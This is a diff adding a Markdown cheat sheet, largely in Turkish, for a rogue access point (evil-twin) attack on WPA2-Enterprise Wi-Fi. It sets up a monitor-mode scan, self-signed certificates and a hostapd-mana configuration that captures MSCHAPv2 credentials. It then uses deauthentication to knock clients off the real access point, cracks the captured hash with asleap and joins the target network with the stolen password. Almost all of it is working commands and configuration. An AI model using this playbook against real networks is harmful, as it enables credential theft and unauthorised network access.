@@ -1,0 +1,113 @@
+
+### Hazırlık
+```bash
+sudo su
+ip -br -c a
+```
+
+# Kanal numarası ve AP ismi almadan önce, kablosuz kartın ismini bulmalısınız, monitoring işlemini sonlandırabilirsiniz.
+
+# Stop monitor mode
+    airmon-ng stop wlan0
+
+### Monitor Mod + Tarama
+```bash
+sudo airmon-ng start wlan0
+airodump-ng wlan0mon --band abg
+# BSSID ve Channel not et
+```
+
+### Sertifika Oluştur
+```bash
+openssl genrsa -aes256 -out ca.key.pem 4096
+# Şifre: 1234
+openssl req -x509 -new -nodes -key ca.key.pem -sha256 -days 3650 -out ca.cert.pem
+# Bilgileri doldur (ülke, şehir vs.)
+openssl genrsa -aes256 -out server.key.pem 2048
+# Şifre: 1234
+openssl req -new -key server.key.pem -out server.csr.pem
+# Bilgileri doldur
+openssl x509 -req -in server.csr.pem -CA ca.cert.pem -CAkey ca.key.pem -CAcreateserial -out server.cert.pem -days 365 -sha256
+openssl dhparam -out dh -2 2048
+```
+
+### EAP User Dosyası
+```bash
+nano mana.eap_user
+```
+
+# Create .eap_user file
+```
+* PEAP,TTLS,TLS,FAST
+"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "pass" [2]
+```
+
+### Mana Config
+```bash
+nano mana.conf
+```
+```
+ssid=[TARGET_SSID]
+interface=wlan0
+driver=nl80211
+channel=[TARGET_CHANNEL]
+hw_mode=g
+ieee8021x=1
+eap_server=1
+eapol_key_index_workaround=0
+eap_user_file=mana.eap_user
+ca_cert=ca.cert.pem
+server_cert=server.cert.pem
+private_key=server.key.pem
+private_key_passwd=1234
+dh_file=dh
+auth_algs=1
+wpa=3 # It means that wpa/wpa2
+wpa_key_mgmt=WPA-EAP # It means that WPA Enterprise 
+wpa_pairwise=CCMP TKIP
+mana_wpe=1
+mana_credout=/tmp/hostapd.credout
+mana_eapsuccess=1
+```
+
+### Sahte AP Başlat + Deauth
+```bash
+# Terminal 1:
+hostapd-mana mana.conf
+
+# Terminal 2 (opsiyonel - kullanıcıyı kopartmak için):
+aireplay-ng -0 10 -a [REAL_AP_MAC] wlan0
+# Hash yakalandığında Ctrl+C
+```
+
+# yakalanan kullanıcı kimlik bilgilerinin hash'ini alın ve asleap aracıyla kırın.
+```bash
+cat /tmp/hostapd.credout
+# challenge ve response değerlerini not et
+
+asleap -C [challenge] -R [response] -W /usr/share/john/password.lst
+# password: [PASSWORD] çıktısını kaydet
+```
+
+### Bağlan
+```bash
+nano wpa_sup.conf
+```
+```
+network={
+    ssid="[SSID]"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="[DOMAIN]\[USERNAME]"
+    password="[PASSWORD]"
+    phase2="auth=MSCHAPV2"
+    priority=1
+}
+```
+```bash
+airmon-ng stop wlan0mon
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_sup.conf
+# Yeni terminal:
+dhclient wlan0 -v
+```
+     
